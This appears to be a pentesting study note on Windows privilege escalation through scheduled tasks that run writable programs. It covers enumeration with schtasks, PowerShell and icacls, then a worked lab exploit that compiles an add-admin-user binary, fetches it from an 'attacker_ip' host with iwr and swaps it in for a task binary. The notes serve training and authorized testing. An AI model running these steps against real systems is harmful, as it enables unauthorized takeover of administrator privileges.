# Scheduled Tasks

Scheduled Tasks = automated tasks executed by Task Scheduler based on triggers
- Triggers =  e.g. time, date, startup, logon, Win event  
- Action = program/script/command executed by the task

Privileged scheduled task + writable action path -> code execution as privileged user

Requirements & Attack Vector 
1. Privileged run context
   - `Run As User` = `NT AUTHORITY\SYSTEM` / `Administrator` / privileged user -> high-value
   - `Run As User` = current low-priv user -> usually not useful for privesc

2. Triggerable execution
   - Runs every minute / every few minutes -> useful
   - Runs on startup / logon -> useful if reboot or login trigger possible
   - Current user can manually start task -> useful
   - Next run time far in future -> lower priority

3. Controllable action path
   - `Task To Run` = writable binary/script -> potential privesc
   - Parent dir writable -> possible binary/script replacement
   - `Start In` dir writable -> check for relative path abuse
   - Relative path used -> may be influenceable

4. Confirmed permissions
   - `icacls "C:\Path\To\task.exe"` -> check action file perms
   - `icacls "C:\Path\To"` -> check parent dir perms
   - `F` / `M` / `W` for low-priv user/group -> interesting
   - Can edit / replace / write into path -> exploitable candidate
  
```cmd 
schtasks /query /fo LIST /v
```

| `schtasks` Flag | Meaning                                  |
| --------------- | ---------------------------------------- |
| `/query`        | Query scheduled tasks                    |
| `/fo LIST`      | Output format = list                     |
| `/v`            | Verbose output, show all task properties |

| Field           | Interesting value                     | Use                                      |
| --------------- | ------------------------------------- | ---------------------------------------- |
| `Run As User`   | `SYSTEM`                              | Runs with highest local privileges.      |
| `Run As User`   | `Administrator`                       | Runs with local admin privileges.        |
| `Run As User`   | `privileged_user`                     | May allow user-to-admin escalation.      |
| `Task To Run`   | `C:\Users\lowpriv_user\something.exe` | Executable may be user-writable.         |
| `Task To Run`   | `C:\Users\lowpriv_user\script.bat`    | Script may be editable by low-priv user. |
| `Schedule Type` | `At system start up`                  | May trigger after reboot.                |
| `Schedule Type` | `Minute`                              | Repeats often, easier to test.           |


```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State

# Check task action paths:
Get-ScheduledTask |  
ForEach-Object {  
    $_.Actions  
}

# PS filter for Task + User + Action
Get-ScheduledTask |  
Select-Object TaskName,TaskPath,State,  
@{Name="RunAs";Expression={$_.Principal.UserId}},  
@{Name="Execute";Expression={$_.Actions.Execute}},  
@{Name="Arguments";Expression={$_.Actions.Arguments}},  
@{Name="StartIn";Expression={$_.Actions.WorkingDirectory}}
```

| Status                          | Use                                     |
| ------------------------------- | --------------------------------------- |
| Runs as `SYSTEM` or admin       | High-value execution context            |
| Runs as another privileged user | Possible user-to-admin escalation       |
| Executes writable script        | Add commands or replace contents        |
| Executes writable binary        | Replace binary with payload             |
| Executes from writable folder   | Possible binary replacement             |
| Runs soon or repeatedly         | Easier to trigger during exam           |
| Has `Start In` path             | Check relative path abuse               |
e.g. 
```cmd
schtasks /query /fo LIST /v

Folder: \
HostName:                             HOSTNAME
TaskName:                             \BackupTask
Next Run Time:                        4/26/2026 10:00:00 PM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        4/26/2026 9:00:00 PM
Last Result:                          0
Author:                               HOSTNAME\Administrator
Task To Run:                          C:\Program Files\Backup Service\backup.bat
Start In:                             C:\Program Files\Backup Service
Comment:                              Runs local backup job
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          NT AUTHORITY\SYSTEM
Schedule Type:                        Hourly
Start Time:                           9:00:00 PM
Start Date:                           4/26/2026
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        1 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

# check permissions
icacls "C:\Program Files\Backup Service\backup.bat"
icacls "C:\Program Files\Backup Service"
```

| Field           | Example                                      | Use                             |
| --------------- | -------------------------------------------- | ------------------------------- |
| `TaskName`      | `\BackupTask`                                | Task to investigate.            |
| `Task To Run`   | `C:\Program Files\Backup Service\backup.bat` | File executed by the task.      |
| `Run As User`   | `NT AUTHORITY\SYSTEM`                        | High-value execution context.   |
| `Schedule Type` | `Hourly`                                     | Runs repeatedly.                |
| `Start In`      | `C:\Program Files\Backup Service`            | Check folder permissions.       |
| `Next Run Time` | `4/26/2026 10:00:00 PM`                      | Tells when it may execute next. |
e.g. 
```powershell
Get-ScheduledTask | Select-Object TaskName,TaskPath,State

TaskName                          TaskPath                               State
--------                          --------                               -----
BackupTask                        \                                      Ready
UserCleanup                       \                                      Ready
ScheduledDefrag                   \Microsoft\Windows\Defrag\            Ready
Windows Defender Scheduled Scan   \Microsoft\Windows\Windows Defender\  Ready
AppUpdater                        \Custom\                              Disabled
# =D note `BackupTask`  `UserCleanup`  `AppUpdater`


# Check task action paths:
Get-ScheduledTask |  
ForEach-Object {  
$_.Actions  
}

Id               :
Arguments        : /c C:\Program Files\Backup Service\backup.bat
Execute          : cmd.exe
WorkingDirectory : C:\Program Files\Backup Service

Id               :
Arguments        : -ExecutionPolicy Bypass -File C:\Users\Public\cleanup.ps1
Execute          : powershell.exe
WorkingDirectory : C:\Users\Public

Id               :
Arguments        : -c -h -o -$
Execute          : %windir%\system32\defrag.exe
WorkingDirectory :

Id               :
Arguments        : /Scan
Execute          : C:\Program Files\Windows Defender\MpCmdRun.exe
WorkingDirectory : C:\Program Files\Windows Defender

icacls "C:\Program Files\Backup Service\backup.bat"  
icacls "C:\Program Files\Backup Service"  
icacls "C:\Users\Public\cleanup.ps1"  
icacls "C:\Users\Public"
```

| Execute                        | Arguments                                       | Use                                              |
| ------------------------------ | ----------------------------------------------- | ------------------------------------------------ |
| `cmd.exe`                      | `/c C:\Program Files\Backup Service\backup.bat` | Check whether `.bat` file or folder is writable. |
| `powershell.exe`               | `-File C:\Users\Public\cleanup.ps1`             | `C:\Users\Public` is often worth checking.       |
| `%windir%\system32\defrag.exe` | `-c -h -o -$`                                   | Normal Windows task, usually lower priority.     |
| `MpCmdRun.exe`                 | `/Scan`                                         | Defender task, usually lower priority.           |

e.g
```powershell
# PS filter for Task + User + Action
Get-ScheduledTask |  
Select-Object TaskName,TaskPath,State,  
@{Name="RunAs";Expression={$_.Principal.UserId}},  
@{Name="Execute";Expression={$_.Actions.Execute}},  
@{Name="Arguments";Expression={$_.Actions.Arguments}},  
@{Name="StartIn";Expression={$_.Actions.WorkingDirectory}}

TaskName      : BackupTask
TaskPath      : \
State         : Ready
RunAs         : SYSTEM
Execute       : cmd.exe
Arguments     : /c C:\Program Files\Backup Service\backup.bat
StartIn       : C:\Program Files\Backup Service

TaskName      : UserCleanup
TaskPath      : \
State         : Ready
RunAs         : HOSTNAME\Administrator
Execute       : powershell.exe
Arguments     : -ExecutionPolicy Bypass -File C:\Users\Public\cleanup.ps1
StartIn       : C:\Users\Public

TaskName      : ScheduledDefrag
TaskPath      : \Microsoft\Windows\Defrag\
State         : Ready
RunAs         : LocalSystem
Execute       : %windir%\system32\defrag.exe
Arguments     : -c -h -o -$
StartIn       :

# =D UserCleanup Runs as `HOSTNAME\Administrator`.
# - Executes a PowerShell script.
# - Script is in `C:\Users\Public`.
# - Parent directory may be writable by standard users.

icacls "C:\Users\Public\cleanup.ps1"

C:\Users\Public\cleanup.ps1 NT AUTHORITY\SYSTEM:(F)  
BUILTIN\Administrators:(F)  
BUILTIN\Users:(M)  
Everyone:(RX)
# BUILTIN\Users:(M) -> modify into exploit! 
```

##  Exploitation of Vulnerability

```cmd
:: If a task runs as a privileged user and executes a writable binary:
move task_binary.exe task_binary.exe.bak  
copy shell.exe task_binary.exe

:: wait for the scheduled trigger or try
schtasks /run /tn "\Task\Name"
```

- good practice in pentesting to back-up -> replace file -> exploit -> put it back 


e.g. Scheduled Task Exploitation 

Attack Vector
1. `schtasks /query /fo LIST /v  `
2. Find custom task  
3. Check Run As User  
4. Check Task To Run  
5. Check Start In  
6. Check Next Run Time / Schedule Type  
7. `icacls` task binary  
8. `icacls` parent directory  
9. Backup original  
10. Replace writable binary/script  
11. Wait or trigger task  
12. Verify execution context  
13. Restore original if needed


```cmd
schtasks /query /fo LIST /v

Folder: \Microsoft
HostName:                             HOSTNAME
TaskName:                             \Microsoft\CacheCleanup
Next Run Time:                        7/11/2022 2:47:21 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        7/11/2022 2:46:22 AM
Last Result:                          0
Author:                               HOSTNAME\kira
Task To Run:                          C:\Users\alice\Pictures\BackendCacheCleanup.exe
Start In:                             C:\Users\alice\Pictures
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          kira
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Minute
Start Time:                           7:37:21 AM
Start Date:                           7/4/2022
```

| Finding                                                           | Use                                 |
| ----------------------------------------------------------------- | ----------------------------------- |
| `TaskName` = `\Microsoft\CacheCleanup`                            | Custom-looking task worth checking  |
| `Author` = `HOSTNAME\kira`                                     | Created by another user             |
| `Task To Run` = `C:\Users\alice\Pictures\BackendCacheCleanup.exe` | Executes from low-priv user profile |
| `Start In` = `C:\Users\alice\Pictures`                            | Working directory may be writable   |
| `Run As User` = `kira`                                            | Runs as another user                |
| `Schedule Type` = `Minute`                                        | Runs repeatedly                     |
| `Last Run Time` / `Next Run Time`                                 | Confirms frequent execution         |

Prerequisites
1. Task runs as kira -> Task executes file inside `C:\Users\alice\Pictures`
2. alice can modify file
Attack Vector
-> replace `BackendCacheCleanup.exe`
-> task runs replacement as kira

Check Permissions
```cmd
:: check action file perm
icacls "C:\Users\alice\Pictures\BackendCacheCleanup.exe"

C:\Users\alice\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                BUILTIN\Administrators:(I)(F)
                                                HOSTNAME\alice:(I)(F)
                                                HOSTNAME\offsec:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

`HOSTNAME\alice:(I)(F)` -> alice has Full Control

```cmd
:: check parent dir perm 
icacls "C:\Users\alice\Pictures"

C:\Users\alice\Pictures NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)  
BUILTIN\Administrators:(I)(OI)(CI)(F)  
HOSTNAME\alice:(I)(OI)(CI)(F)  
HOSTNAME\offsec:(I)(OI)(CI)(RX)  
Everyone:(I)(RX)  
  
Successfully processed 1 files; Failed processing 0 files
```

`HOSTNAME\alice:(I)(OI)(CI)(F)` -> alice has Full Control

create small binary [adduser.c](../../03-tools/scripts/adduser.c) +  [adduser.exe](../../03-tools/scripts/adduser.exe)  on Kali 
-> create user kira $\in$ local Adminstrators group
```bash  
# Compile a 64-bit Windows executable `x86_64-w64-mingw32-gcc`
└─$ vim adduser.c
└─$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe 

# host from kali 
└─$ python3 -m http.server 80                                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
"GET /adduser.exe HTTP/1.1" 200 -
```  

```powershell  
# Back up the original service binary if possible:
move C:\Users\alice\Pictures\BackendCacheCleanup.exe C:\Users\alice\Pictures\BackendCacheCleanup.exe.bak

# Replace the service binary:
iwr -Uri http://attacker_ip/adduser.exe -OutFile C:\Users\alice\BackendCacheCleanup.exe

move C:\Users\alice\BackendCacheCleanup.exe C:\Users\alice\Pictures\

# Confirm replacement
dir C:\Users\alice\Pictures\BackendCacheCleanup.exe

# wait or try to run manually
schtasks /run /tn "\Microsoft\CacheCleanup"
# note: Manual run may fail if current user lacks permission, but the scheduled trigger may still run normally.

# verify if user created
net user   
net localgroup administrators

# restore original binary
move C:\Users\alice\Pictures\BackendCacheCleanup.exe C:\Users\alice\Pictures\BackendCacheCleanup_payload.exe

move C:\Users\alice\Pictures\BackendCacheCleanup.exe.bak C:\Users\alice\Pictures\BackendCacheCleanup.exe
```


Common mistakes / Troubleshooting 
- Seeing `Run As User = SYSTEM` and assuming exploitable without checking write perms.
- Only checking `Task To Run` and ignoring `Start In`.
- Forgetting to check the parent directory.
- Ignoring tasks that run as another privileged local/domain user.
- Missing tasks that run every minute because output is too long.
- Replacing a binary without making a backup.
- Using a noisy payload before confirming execution with `whoami > file.txt`.
- Forgetting that manual `schtasks /run` may fail even if the scheduled trigger works.

